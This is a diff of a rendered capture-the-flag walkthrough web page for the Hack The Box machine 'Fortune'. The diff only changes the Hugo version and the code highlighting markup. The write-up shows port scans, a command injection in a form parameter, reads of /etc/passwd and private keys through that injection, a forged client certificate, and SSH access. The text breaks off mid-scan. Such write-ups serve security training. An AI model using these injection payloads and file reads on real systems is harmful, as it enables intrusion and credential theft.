@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.78.1" />
+<meta name="generator" content="Hugo 0.91.2" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -319,102 +319,105 @@ if (language) {
 
 <p>Let&rsquo;s scan the full range of TCP and UDP ports using my tool <a href="https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py" target="_blank">htbscan.py</a></p>
 
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo htbscan.py 10.10.10.127
-
-Running command: sudo masscan -e tun0 -p0-65535 --max-rate 500 --interactive 10.10.10.127
-
-Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-03-12 09:10:57 GMT
- -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
-Initiating SYN Stealth Scan
-Scanning 1 hosts [65536 ports/host]
-Discovered open port 80/tcp on 10.10.10.127
-Discovered open port 22/tcp on 10.10.10.127
-Discovered open port 443/tcp on 10.10.10.127
-
-Running command: sudo nmap -A -p22,80,443 10.10.10.127
-
-Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-12 11:20 EET
-Nmap scan report for 10.10.10.127
-Host is up (0.059s latency).
-
-PORT    STATE SERVICE    VERSION
-22/tcp  open  ssh        OpenSSH 7.9 (protocol 2.0)
-| ssh-hostkey:
-|   2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA)
-|   256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA)
-|_  256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (ED25519)
-80/tcp  open  http       OpenBSD httpd
-|_http-server-header: OpenBSD httpd
-|_http-title: Fortune
-443/tcp open  ssl/https?
-|_ssl-date: TLS randomness does not represent time
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Aggressive OS guesses: OpenBSD 4.0 (95%), OpenBSD 4.4 - 4.5 (95%), OpenBSD 6.0 - 6.1 (94%), OpenBSD 5.0 (94%), OpenBSD 5.0 - 5.8 (94%), OpenBSD 4.9 (93%), OpenBSD 4.6 (93%), FreeBSD 10.0-CURRENT (93%), OpenBSD 4.7 (92%), OpenBSD 6.0 (92%)
-No exact OS matches for host (test conditions non-ideal).</code></pre></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo htbscan.py 10.10.10.127
+<span class="err">
+</span><span class="err"></span><span class="go">Running command: sudo masscan -e tun0 -p0-65535 --max-rate 500 --interactive 10.10.10.127
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-03-12 09:10:57 GMT
+</span><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+</span><span class="go">Initiating SYN Stealth Scan
+</span><span class="go">Scanning 1 hosts [65536 ports/host]
+</span><span class="go">Discovered open port 80/tcp on 10.10.10.127
+</span><span class="go">Discovered open port 22/tcp on 10.10.10.127
+</span><span class="go">Discovered open port 443/tcp on 10.10.10.127
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Running command: sudo nmap -A -p22,80,443 10.10.10.127
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-12 11:20 EET
+</span><span class="go">Nmap scan report for 10.10.10.127
+</span><span class="go">Host is up (0.059s latency).
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">PORT    STATE SERVICE    VERSION
+</span><span class="go">22/tcp  open  ssh        OpenSSH 7.9 (protocol 2.0)
+</span><span class="go">| ssh-hostkey:
+</span><span class="go">|   2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA)
+</span><span class="go">|   256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA)
+</span><span class="go">|_  256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (ED25519)
+</span><span class="go">80/tcp  open  http       OpenBSD httpd
+</span><span class="go">|_http-server-header: OpenBSD httpd
+</span><span class="go">|_http-title: Fortune
+</span><span class="go">443/tcp open  ssl/https?
+</span><span class="go">|_ssl-date: TLS randomness does not represent time
+</span><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+</span><span class="go">Aggressive OS guesses: OpenBSD 4.0 (95%), OpenBSD 4.4 - 4.5 (95%), OpenBSD 6.0 - 6.1 (94%), OpenBSD 5.0 (94%), OpenBSD 5.0 - 5.8 (94%), OpenBSD 4.9 (93%), OpenBSD 4.6 (93%), FreeBSD 10.0-CURRENT (93%), OpenBSD 4.7 (92%), OpenBSD 6.0 (92%)
+</span><span class="go">No exact OS matches for host (test conditions non-ideal).
+</span></code></pre></div></div>
 
 <h2 id="port-80">Port 80</h2>
 
 <p>Let&rsquo;s brute-force directories and files on port 80 using gobuster:</p>
 
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ gobuster -u http://10.10.10.127 -w /opt/DirBuster/directory-list-2.3-medium.txt -t 50
-
-=====================================================
-Gobuster v2.0.1              OJ Reeves (@TheColonial)
-=====================================================
-[+] Mode         : dir
-[+] Url/Domain   : http://10.10.10.127/
-[+] Threads      : 50
-[+] Wordlist     : /opt/DirBuster/directory-list-2.3-medium.txt
-[+] Status codes : 200,204,301,302,307,403
-[+] Timeout      : 10s
-=====================================================
-2019/03/12 11:34:11 Starting gobuster
-=====================================================
-/fortune (Status: 301)
-/select (Method not allowed)</code></pre></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>gobuster -u http://10.10.10.127 -w /opt/DirBuster/directory-list-2.3-medium.txt -t <span class="m">50</span>
+<span class="err">
+</span><span class="err"></span><span class="go">=====================================================
+</span><span class="go">Gobuster v2.0.1              OJ Reeves (@TheColonial)
+</span><span class="go">=====================================================
+</span><span class="go">[+] Mode         : dir
+</span><span class="go">[+] Url/Domain   : http://10.10.10.127/
+</span><span class="go">[+] Threads      : 50
+</span><span class="go">[+] Wordlist     : /opt/DirBuster/directory-list-2.3-medium.txt
+</span><span class="go">[+] Status codes : 200,204,301,302,307,403
+</span><span class="go">[+] Timeout      : 10s
+</span><span class="go">=====================================================
+</span><span class="go">2019/03/12 11:34:11 Starting gobuster
+</span><span class="go">=====================================================
+</span><span class="go">/fortune (Status: 301)
+</span><span class="go">/select (Method not allowed)
+</span></code></pre></div></div>
 
 <h2 id="port-443">Port 443</h2>
 
 <p>When we try to connect to port 443 (https), the browser ask us for a client certificate. We can run a <em>sslyze</em> scan to verify it and get more info:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sslyze --regular 10.10.10.127
-
-...
- CHECKING HOST(S) AVAILABILITY
- -----------------------------
-   10.10.10.127:443                       =&gt; 10.10.10.127   WARNING: Server REQUIRED client authentication, specific plugins will fail.
-
-
- SCAN RESULTS FOR 10.10.10.127:443 - 10.10.10.127
- ------------------------------------------------
-
- * Downgrade Attacks:
-       TLS_FALLBACK_SCSV:                 OK - Supported
- * Deflate Compression:
-                                          OK - Compression disabled
- * OpenSSL CCS Injection:
-                                          OK - Not vulnerable to OpenSSL CCS injection
-
- * Certificate Information:
-     Content
-       SHA1 Fingerprint:                  f5528e05f76ef7013a6ce1b9888e60aa36c4e4a6
-       Common Name:                       fortune.htb
-       Issuer:                            Fortune Intermediate CA
-       Serial Number:                     4096
-       Not Before:                        2018-10-30 01:13:42
-       Not After:                         2019-11-09 01:13:42
-       Signature Algorithm:               sha256
-       Public Key Algorithm:              RSA
-       Key Size:                          2048
-       Exponent:                          65537 (0x10001)
-       DNS Subject Alternative Names:     []
-...</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sslyze --regular 10.10.10.127
+<span class="err">
+</span><span class="err"></span><span class="go">...
+</span><span class="go"> CHECKING HOST(S) AVAILABILITY
+</span><span class="go"> -----------------------------
+</span><span class="go">   10.10.10.127:443                       =&gt; 10.10.10.127   WARNING: Server REQUIRED client authentication, specific plugins will fail.
+</span><span class="go"></span><span class="err">
+</span><span class="err">
+</span><span class="err"></span><span class="go"> SCAN RESULTS FOR 10.10.10.127:443 - 10.10.10.127
+</span><span class="go"> ------------------------------------------------
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go"> * Downgrade Attacks:
+</span><span class="go">       TLS_FALLBACK_SCSV:                 OK - Supported
+</span><span class="go"> * Deflate Compression:
+</span><span class="go">                                          OK - Compression disabled
+</span><span class="go"> * OpenSSL CCS Injection:
+</span><span class="go">                                          OK - Not vulnerable to OpenSSL CCS injection
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go"> * Certificate Information:
+</span><span class="go">     Content
+</span><span class="go">       SHA1 Fingerprint:                  f5528e05f76ef7013a6ce1b9888e60aa36c4e4a6
+</span><span class="go">       Common Name:                       fortune.htb
+</span><span class="go">       Issuer:                            Fortune Intermediate CA
+</span><span class="go">       Serial Number:                     4096
+</span><span class="go">       Not Before:                        2018-10-30 01:13:42
+</span><span class="go">       Not After:                         2019-11-09 01:13:42
+</span><span class="go">       Signature Algorithm:               sha256
+</span><span class="go">       Public Key Algorithm:              RSA
+</span><span class="go">       Key Size:                          2048
+</span><span class="go">       Exponent:                          65537 (0x10001)
+</span><span class="go">       DNS Subject Alternative Names:     []
+</span><span class="go">...
+</span></code></pre></div></div></p>
 
 <h1 id="exploitation">Exploitation</h1>
 
 <h2 id="gaining-rce-due-to-command-injection">Gaining RCE due to command Injection</h2>
 
 <p>If we visit <a href="http://10.10.10.127/" target="_blank">http://10.10.10.127/</a>, we see a form:
-<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;/select&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span><span class="p">&gt;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;/select&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span><span class="p">&gt;</span>
   <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;radio&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;db&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;fortunes&#34;</span><span class="p">&gt;</span> fortunes<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
   <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;radio&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;db&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;fortunes2&#34;</span><span class="p">&gt;</span> fortunes2<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
   <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;radio&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;db&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;recipes&#34;</span><span class="p">&gt;</span> recipes<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
@@ -425,35 +428,36 @@ Gobuster v2.0.1              OJ Reeves (@TheColonial)
 <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span></code></pre></div></p>
 
 <p>The parameter &lsquo;db&rsquo; is vulnerable to command injection:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl -X POST http://10.10.10.127/select --data &#39;db=whatever|id&#39;
-
-&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;head&gt;
-&lt;title&gt;Your fortune&lt;/title&gt;
-&lt;meta name=&#39;viewport&#39; content=&#39;width=device-width, initial-scale=1&#39;&gt;
-&lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;IE=edge&#34;&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;h2&gt;Your fortune is:&lt;/h2&gt;
-&lt;p&gt;&lt;pre&gt;
-
-uid=512(_fortune) gid=512(_fortune) groups=512(_fortune)
-
-
-&lt;/pre&gt;&lt;p&gt;
-&lt;p&gt;Try &lt;a href=&#39;/&#39;&gt;again&lt;/a&gt;!&lt;/p&gt;
-&lt;/body&gt;</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>curl -X POST http://10.10.10.127/select --data <span class="s1">&#39;db=whatever|id&#39;</span>
+<span class="err">
+</span><span class="err"></span><span class="go">&lt;!DOCTYPE html&gt;
+</span><span class="go">&lt;html&gt;
+</span><span class="go">&lt;head&gt;
+</span><span class="go">&lt;title&gt;Your fortune&lt;/title&gt;
+</span><span class="go">&lt;meta name=&#39;viewport&#39; content=&#39;width=device-width, initial-scale=1&#39;&gt;
+</span><span class="go">&lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;IE=edge&#34;&gt;
+</span><span class="go">&lt;/head&gt;
+</span><span class="go">&lt;body&gt;
+</span><span class="go">&lt;h2&gt;Your fortune is:&lt;/h2&gt;
+</span><span class="go">&lt;p&gt;&lt;pre&gt;
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">uid=512(_fortune) gid=512(_fortune) groups=512(_fortune)
+</span><span class="go"></span><span class="err">
+</span><span class="err">
+</span><span class="err"></span><span class="go">&lt;/pre&gt;&lt;p&gt;
+</span><span class="go">&lt;p&gt;Try &lt;a href=&#39;/&#39;&gt;again&lt;/a&gt;!&lt;/p&gt;
+</span><span class="go">&lt;/body&gt;
+</span></code></pre></div></div></p>
 
 <p>Thus, we have gained Remote Command Execution to this machine.</p>
 
 <p>Here is the relevant backend code (fortuned.py) for reference:
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">abort</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">abort</span>
 <span class="kn">import</span> <span class="nn">os</span>
 
 <span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
 
-<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/select&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/select&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
 <span class="k">def</span> <span class="nf">fortuned</span><span class="p">():</span>
 
     <span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;/usr/games/fortune &#39;</span>
@@ -466,31 +470,36 @@ uid=512(_fortune) gid=512(_fortune) groups=512(_fortune)
 <h2 id="acquiring-a-client-certificate">Acquiring a client certificate</h2>
 
 <p>If we search a little the home folders, we find some private keys:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl --silent -X POST http://10.10.10.127/select --data &#39;db=whatever|ls -al /home/bob/ca/intermediate/private/&#39;
-...
-total 20
-drwxr-xr-x  2 bob  bob   512 Oct 29  2018 .
-drwxr-xr-x  7 bob  bob   512 Nov  3  2018 ..
--r--------  1 bob  bob  1675 Oct 29  2018 fortune.htb.key.pem
--rw-r--r--  1 bob  bob  3243 Oct 29  2018 intermediate.key.pem
-...</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>curl --silent -X POST http://10.10.10.127/select --data <span class="s1">&#39;db=whatever|ls -al /home/bob/ca/intermediate/private/&#39;</span>
+<span class="go">...
+</span><span class="go">total 20
+</span><span class="go">drwxr-xr-x  2 bob  bob   512 Oct 29  2018 .
+</span><span class="go">drwxr-xr-x  7 bob  bob   512 Nov  3  2018 ..
+</span><span class="go">-r--------  1 bob  bob  1675 Oct 29  2018 fortune.htb.key.pem
+</span><span class="go">-rw-r--r--  1 bob  bob  3243 Oct 29  2018 intermediate.key.pem
+</span><span class="go">...
+</span></code></pre></div></div></p>
 
 <p>Well, we don&rsquo;t have permissions to read fortune.htb.key.pem, but we can read intermediate.key.pem:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl --silent -X POST http://10.10.10.127/select --data &#39;db=whatevat|cat /home/bob/ca/intermediate/private/intermediate.key.pem&#39; | grep -zo &#39;\-\-.*\-\-&#39; &gt; intermediate.key.pem</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>curl --silent -X POST http://10.10.10.127/select --data <span class="s1">&#39;db=whatevat|cat /home/bob/ca/intermediate/private/intermediate.key.pem&#39;</span> <span class="p">|</span> grep -zo <span class="s1">&#39;\-\-.*\-\-&#39;</span> &gt; intermediate.key.pem
+</code></pre></div></div></p>
 
 <p>Inside /home/bob/ca/intermediate/certs/ there is the respective certificate:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl --silent -X POST http://10.10.10.127/select --data &#39;db=whatever|cat /home/bob/ca/intermediate/certs/intermediate.cert.pem&#39; | grep -zo &#39;\-\-.*\-\-&#39; &gt; intermediate.cert.pem</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>curl --silent -X POST http://10.10.10.127/select --data <span class="s1">&#39;db=whatever|cat /home/bob/ca/intermediate/certs/intermediate.cert.pem&#39;</span> <span class="p">|</span> grep -zo <span class="s1">&#39;\-\-.*\-\-&#39;</span> &gt; intermediate.cert.pem
+</code></pre></div></div></p>
 
 <p>We can combine the certificate and private key to a pkcs#12 file which we can import to our browser:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ openssl pkcs12 -inkey intermediate.key.pem -in intermediate.cert.pem -export -out client.p12
-Enter Export Password: pass
-Verifying - Enter Export Password: pass</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>openssl pkcs12 -inkey intermediate.key.pem -in intermediate.cert.pem -export -out client.p12
+<span class="go">Enter Export Password: pass
+</span><span class="go">Verifying - Enter Export Password: pass
+</span></code></pre></div></div></p>
 
 <p>Now, let&rsquo;s import client.p12 to your browser and visit <a href="https://10.10.10.147" target="_blank">https://10.10.10.147</a> (When we are being asked for it, we choose our recently imported client certificate. We also have to add an exception for the self-signed certificate of the website server). If we want to use curl the following command is sufficient:</p>
 
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl --insecure --key intermediate.key.pem --cert intermediate.cert.pem https://10.10.10.127</code></pre></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>curl --insecure --key intermediate.key.pem --cert intermediate.cert.pem https://10.10.10.127
+</code></pre></div></div>
 
-<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html&gt;</span>
 <span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
 <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
 <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Elevated network access<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
@@ -510,7 +519,7 @@ one and configure your local system appropriately to proceed.
 <h2 id="ssh-authentication-to-authpf">SSH authentication to authpf</h2>
 
 <p>It works! If we visit <a href="https://10.10.10.127/generate" target="_blank">https://10.10.10.127/generate</a> we see that:
-<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">AuthPF SSH Access
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">AuthPF SSH Access
 The following public key has been added to the database of authorized keys:
 
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5mx7yvTtW2FYsO+zwdqePx+44nyc+PnzD/4u+vS3nEIyQMUqeKKIFBMLNiKLnMfCUb4KZWm9r4qG45NWSITDF7t70z1co4ZrDz5wyLhQxZiZ2ZK9AzIzFECfYTFCMiLO7WAWS2fyK/KiYftFo6BNySgI/+tRuzZmaqbNqkjwF7o1ppaHUS415stjzNm+ohhMtVY5gDxsJen/aYzyPYH/ac4LOHNWqnxE1m21qyITGOQlCOjOP4wVfHbaT7mTBUSPDuHnA68WdAV0hwIKNOSFz/KiMA9yqbA7Tswpv2njS9FTta+yfeIcDdNcio5OVr5FrEpiljL88LIwXz1uoC5yL
@@ -527,24 +536,28 @@ Please save the above key pair to your local system with appropriate file permis
 Please note: If the IP address of your local system changes, then you may need to generate a new key pair.</code></pre></div></p>
 
 <p>We can copy this private key and paste it into a file, but -as you have noticed- I prefer doing things a bit differently (^_^):
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl --silent --insecure --key intermediate.key.pem --cert intermediate.cert.pem https://10.10.10.127/generate | grep -zo &#39;\-\-.*\-\-&#39; &gt; fortune_id_rsa</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>curl --silent --insecure --key intermediate.key.pem --cert intermediate.cert.pem https://10.10.10.127/generate <span class="p">|</span> grep -zo <span class="s1">&#39;\-\-.*\-\-&#39;</span> &gt; fortune_id_rsa
+</code></pre></div></div></p>
 
 <p>Don&rsquo;t forget to set the required strict permissions:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">chmod 600 fortune_id_rsa</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">chmod 600 fortune_id_rsa
+</span></code></pre></div></div></p>
 
 <p>But for whom user is this key? Let&rsquo;s examine /etc/passwd
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl -X POST http://10.10.10.127/select --data &#39;db=whatever|cat /etc/passwd&#39;
-
-root:*:0:0:Charlie &amp;amp;:/root:/bin/ksh
-...
-charlie:*:1000:1000:Charlie:/home/charlie:/bin/ksh
-bob:*:1001:1001::/home/bob:/bin/ksh
-nfsuser:*:1002:1002::/home/nfsuser:/usr/sbin/authpf</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>curl -X POST http://10.10.10.127/select --data <span class="s1">&#39;db=whatever|cat /etc/passwd&#39;</span>
+<span class="err">
+</span><span class="err"></span><span class="go">root:*:0:0:Charlie &amp;amp;:/root:/bin/ksh
+</span><span class="go">...
+</span><span class="go">charlie:*:1000:1000:Charlie:/home/charlie:/bin/ksh
+</span><span class="go">bob:*:1001:1001::/home/bob:/bin/ksh
+</span><span class="go">nfsuser:*:1002:1002::/home/nfsuser:/usr/sbin/authpf
+</span></code></pre></div></div></p>
 
 <p>We notice that one user has been set for authpf as his user shell. Let&rsquo;s see what happens if we try to connect using this <strong><em>nfsuser</em></strong> user and the private key we acquired:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ ssh -i fortune_id_rsa nfsuser@10.10.10.127
-
-Hello nfsuser. You are authenticated from host &#34;10.10.12.134&#34;</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>ssh -i fortune_id_rsa nfsuser@10.10.10.127
+<span class="err">
+</span><span class="err"></span><span class="go">Hello nfsuser. You are authenticated from host &#34;10.10.12.134&#34;
+</span></code></pre></div></div></p>
 
 <p>OK. We have been authenticated but we cannot execute any command&hellip; What exactly is authpf?</p>
 
@@ -555,180 +568,189 @@ Hello nfsuser. You are authenticated from host &#34;10.10.12.134&#34;</code></pr
 <h2 id="2nd-enumeration-having-ntfuser-authenticated-to-authpf-via-ssh">2nd Enumeration (having ntfuser authenticated to authpf via ssh)</h2>
 
 <p>Let&rsquo;s try to enumerate the ports/services again. This time while we are authenticated to authpf as ntfuser via ssh (make sure you have/keep that ssh session open):
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo htbscan.py 10.10.10.127
-
-Running command: sudo masscan -e tun0 -p0-65535 --max-rate 500 --interactive 10.10.10.127
-
-Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-03-15 21:00:54 GMT
- -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
-Initiating SYN Stealth Scan
-Scanning 1 hosts [65536 ports/host]
-Discovered open port 111/tcp on 10.10.10.127
-Discovered open port 817/tcp on 10.10.10.127
-Discovered open port 2049/tcp on 10.10.10.127
-Discovered open port 8081/tcp on 10.10.10.127
-Discovered open port 80/tcp on 10.10.10.127
-Discovered open port 443/tcp on 10.10.10.127
-Discovered open port 22/tcp on 10.10.10.127
-
-Running command: sudo nmap -A -p22,80,111,443,817,2049,8081 10.10.10.127
-
-Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-15 23:04 EET
-Nmap scan report for fortune.htb (10.10.10.127)
-Host is up (0.067s latency).
-
-PORT     STATE SERVICE    VERSION
-22/tcp   open  ssh        OpenSSH 7.9 (protocol 2.0)
-| ssh-hostkey:
-|   2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA)
-|   256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA)
-|_  256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (ED25519)
-80/tcp   open  http       OpenBSD httpd
-|_http-server-header: OpenBSD httpd
-|_http-title: Fortune
-111/tcp  open  rpcbind    2 (RPC #100000)
-| rpcinfo:
-|   program version   port/proto  service
-|   100000  2            111/tcp  rpcbind
-|   100000  2            111/udp  rpcbind
-|   100003  2,3         2049/tcp  nfs
-|   100003  2,3         2049/udp  nfs
-|   100005  1,3          817/tcp  mountd
-|_  100005  1,3          889/udp  mountd
-443/tcp  open  ssl/https?
-|_ssl-date: TLS randomness does not represent time
-817/tcp  open  mountd     1-3 (RPC #100005)
-2049/tcp open  nfs        2-3 (RPC #100003)
-8081/tcp open  http       OpenBSD httpd
-|_http-server-header: OpenBSD httpd
-|_http-title: pgadmin4
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Aggressive OS guesses: OpenBSD 4.4 - 4.5 (95%), OpenBSD 6.0 - 6.1 (95%), OpenBSD 5.0 - 5.8 (95%), FreeBSD 10.0-CURRENT (94%), OpenBSD 4.0 (94%), OpenBSD 5.0 (93%), OpenBSD 4.1 (93%), OpenBSD 4.6 (93%), OpenBSD 4.7 (93%), OpenBSD 6.0 (93%)</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo htbscan.py 10.10.10.127
+<span class="err">
+</span><span class="err"></span><span class="go">Running command: sudo masscan -e tun0 -p0-65535 --max-rate 500 --interactive 10.10.10.127
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-03-15 21:00:54 GMT
+</span><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+</span><span class="go">Initiating SYN Stealth Scan
+</span><span class="go">Scanning 1 hosts [65536 ports/host]
+</span><span class="go">Discovered open port 111/tcp on 10.10.10.127
+</span><span class="go">Discovered open port 817/tcp on 10.10.10.127
+</span><span class="go">Discovered open port 2049/tcp on 10.10.10.127
+</span><span class="go">Discovered open port 8081/tcp on 10.10.10.127
+</span><span class="go">Discovered open port 80/tcp on 10.10.10.127
+</span><span class="go">Discovered open port 443/tcp on 10.10.10.127
+</span><span class="go">Discovered open port 22/tcp on 10.10.10.127
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Running command: sudo nmap -A -p22,80,111,443,817,2049,8081 10.10.10.127
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-15 23:04 EET
+</span><span class="go">Nmap scan report for fortune.htb (10.10.10.127)
+</span><span class="go">Host is up (0.067s latency).
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">PORT     STATE SERVICE    VERSION
+</span><span class="go">22/tcp   open  ssh        OpenSSH 7.9 (protocol 2.0)
+</span><span class="go">| ssh-hostkey:
+</span><span class="go">|   2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA)
